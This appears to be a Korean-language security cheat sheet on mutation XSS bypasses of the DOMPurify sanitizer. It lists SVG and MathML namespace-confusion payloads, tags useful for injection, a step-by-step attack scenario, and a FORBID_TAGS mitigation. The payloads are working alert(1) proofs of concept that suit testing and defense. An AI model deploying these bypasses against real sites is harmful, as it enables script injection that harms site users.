### 📄 DOMPurify mXSS Bypass Payload 정리표

| 번호 | 페이로드                                                                        | 목적 / 효과                                                 | 악용 포인트 / 설명                                                     |
| -- | --------------------------------------------------------------------------- | ------------------------------------------------------- | --------------------------------------------------------------- |
| 1  | `<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">`             | DOMPurify 통과 후 `innerHTML` 재할당 시 변형되어 XSS 트리거           | **파싱 변화 (mutation)**: `</p>`와 `<svg>`의 네임스페이스 혼동을 유도하여 구조 변경 발생 |
| 2  | `<math></br><style><a id="</style><img src=1 onerror=alert(1)>">`           | `<svg>` 대신 `<math>`을 이용한 변형. 같은 방식으로 DOM 구조 재구성 유도      | 브라우저가 HTML과 XML namespace 혼용 파싱을 다르게 해석함                        |
| 3  | `<svg><style><a id="</style><img src=x onerror=alert(1)>`                   | 단순한 mXSS 테스트. 구조상 안전해보이지만 `innerHTML = innerHTML` 시 트리거 | 초기에는 `<img>`가 attribute 내부에 있지만 재파싱 시 구조 변경됨                    |
| 4  | `<svg><desc><style><a id="</style><img src=1 onerror=alert(1)>`             | `<desc>`를 중간에 넣어 SVG 내부에서 구조 변경 유도                      | `<style>`의 파싱 컨텍스트 변경 가능성 탐색                                    |
| 5  | `<svg><p><style><a id="</style><img src=1 onerror=alert(1)>`                | `<p>`를 넣어 SVG 내 유효하지 않은 태그를 삽입 → 브라우저가 자동 수정 (mutation) | **비정상 구조 → 자동 수정 → DOM 변경 → XSS 가능**                            |
| 6  | `<svg><title><p></title><style><a id="</style><img src=x onerror=alert(1)>` | `<p>` 태그를 `<title>` 내부에 넣어 자동 닫힘 유도                     | `<title>`은 raw text 요소이므로 내부 파싱이 다르게 작동함                        |
| 7  | `<math><mtext></math><style><a id="</style><img src=1 onerror=alert(1)>`    | `<math>` 요소와 `<mtext>`를 이용한 파싱 트릭                       | `<mtext>` 내부에서 파서 분기점 유도 가능                                     |
| 8  | `<svg><foreignObject><p><style><a id="</style><img src=1 onerror=alert(1)>` | SVG 안에서 HTML 파서가 재활성화되는 `foreignObject` 활용              | SVG 안에 HTML 파싱 유도                                               |

---

### 🧠 요약 포인트

| 항목                  | 설명                                                           |
| ------------------- | ------------------------------------------------------------ |
| **공통 핵심 기법**        | SVG / Math 네임스페이스 내부에서 HTML 파서를 강제로 탈출시켜 구조 변형 유도 (mutation) |
| **innerHTML 문제**    | `element.innerHTML = element.innerHTML` 로직 수행 시 구조 변경 발생 가능  |
| **DOMPurify 우회 조건** | DOMPurify는 처음에는 안전하다고 판단 → 그러나 브라우저 재파싱 시 의도치 않게 악성 구조로 변경됨  |
| **취약 브라우저**         | Chrome 77, Safari 등에서 확인됨. 최신 브라우저에서는 일부 방어됨.                |
| **우회 방어법**          | `FORBID_TAGS: ['svg', 'math']` 옵션 사용 or 최신 DOMPurify 사용      |

---

### ✅ 방어 코드 예시 (DOMPurify 설정)

```js
const clean = DOMPurify.sanitize(dirty, {
  FORBID_TAGS: ['svg', 'math']
});
```

---

### 🧨 SVG 내부 특이 태그 정리표

| 태그 이름             | 주요 용도 / 특징                   | XSS 관련 활용 가능성 | 설명                                                         |
| ----------------- | ---------------------------- | ------------- | ---------------------------------------------------------- |
| `<foreignObject>` | HTML과 SVG 혼합 가능              | ✅ 높음          | SVG 안에 **HTML 콘텐츠 삽입 가능**. 네임스페이스 충돌 유도 가능.                |
| `<desc>`          | 설명 (텍스트용)                    | ⚠️ 중간         | 텍스트 콘텐츠로 보이지만 렌더링 및 파싱 특성 상 의도치 않은 취약점 유발 가능               |
| `<title>`         | 툴팁 설명 텍스트                    | ⚠️ 중간         | 내부에 HTML-like 문법 사용 시 브라우저 별 렌더링 차이 발생 가능                  |
| `<style>`         | CSS 정의                       | ✅ 매우 높음       | SVG 내부 `<style>`은 HTML과 달리 **요소 자식을 가질 수 있음** → mXSS 우회    |
| `<script>`        | 자바스크립트 실행                    | 🚫 기본적으로 차단   | 대부분 CSP나 sanitizer에 의해 차단됨. 하지만 일부 SVG 네임스페이스에서는 우회 시도됨    |
| `<mtext>`         | MathML 태그이지만 SVG 내부에서도 존재 가능 | ✅ 높음          | 네임스페이스 변조(mXSS)로 sanitizer 우회 가능성 있음                       |
| `<metadata>`      | 메타데이터 설명                     | ⚠️ 낮음         | 일반적으론 안전하지만 특이한 인코딩이나 콘텐츠 주입 시 렌더링 이상 발생 가능                |
| `<animate>`       | SVG 애니메이션 지정                 | ⚠️ 낮음         | 직접적 XSS보다는 부채널 공격에서 활용 가능                                  |
| `<use>`           | 외부 요소 참조                     | ⚠️ 중간         | href 경로에 따라 외부 콘텐츠 요청 가능 (CSP 우회 시 활용)                     |
| `<set>`           | 속성 설정 애니메이션                  | ⚠️ 낮음         | 특정 속성을 변경해 UX 변조 시도 가능                                     |
| `<image>`         | 이미지 삽입                       | ✅ 높음          | `xlink:href="javascript:..."` 방식 등으로 **구형 브라우저 대상 공격** 시도됨 |

---

## 📌 특이 태그 설명 및 공격 활용 예

### 1. `<foreignObject>` – HTML 삽입의 문

```html
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100" height="100">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert(1)</script>
    </body>
  </foreignObject>
</svg>
```

* **설명**: HTML 네임스페이스를 SVG 내부에 삽입할 수 있음.
* **활용**: DOMPurify 등 필터가 SVG 태그만 검사할 경우 HTML 삽입 가능성 존재.
* **주의**: 최신 브라우저는 `<script>` 삽입을 차단하지만, 복잡한 우회 페이로드 구성 가능.

---

### 2. `<style>` – DOMPurify의 암살자

```html
<svg>
  <style><a id="</style><img src=x onerror=alert(1)>
</svg>
```

* **설명**: HTML의 `<style>`과 달리 SVG 내부의 `<style>`은 자식 요소를 가질 수 있음.
* **활용**: mXSS 공격 시 DOM 구조가 변경되어 `<img>`가 삽입되는 트리거로 사용 가능.

---

### 3. `<desc>`, `<title>`

```html
<svg>
  <desc><img src=x onerror=alert(1)></desc>
</svg>
```

* **설명**: 툴팁 또는 설명 목적으로 사용됨.
* **활용**: 일부 파서에서 텍스트로 처리하지 않고 DOM으로 파싱될 수 있음 → sanitizer와 렌더러 간 불일치 발생.

---

### 4. `<mtext>` – 네임스페이스 교란 도구

```html
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

* **설명**: MathML의 텍스트 요소지만, HTML 렌더러가 제대로 처리하지 못할 수 있음.
* **활용**: HTML + SVG + MathML 혼합 시 파서가 오동작하여 sanitizer 우회 가능.

---

### 5. `<image>` with `xlink:href`

```html
<svg>
  <image xlink:href="javascript:alert(1)" />
</svg>
```

* **설명**: 구형 브라우저에서 `javascript:` 스킴을 해석함.
* **활용**: 최신 브라우저에선 차단되지만, 여전히 일부 레거시 환경에서 우회 가능성 존재.

---

### 💥 실제 공격 시나리오

| 단계  | 설명                                                          |
| --- | ----------------------------------------------------------- |
| 1️⃣ | 공격자는 mXSS 페이로드를 게시글, 댓글, 소개란 등 사용자 입력 필드에 삽입함               |
| 2️⃣ | 서버는 입력값을 **DOMPurify 등으로 sanitize**한 후, 클라이언트에 전송           |
| 3️⃣ | 클라이언트는 sanitize된 HTML을 `innerHTML`로 DOM에 삽입                 |
| 4️⃣ | 이때 브라우저가 sanitize된 HTML을 **자동으로 "수정(mutation)"** 하면서 구조가 바뀜 |
| 5️⃣ | 구조가 바뀌면서 `<img onerror=alert(1)>` 같은 코드가 DOM에 살아남아 XSS 실행됨  |
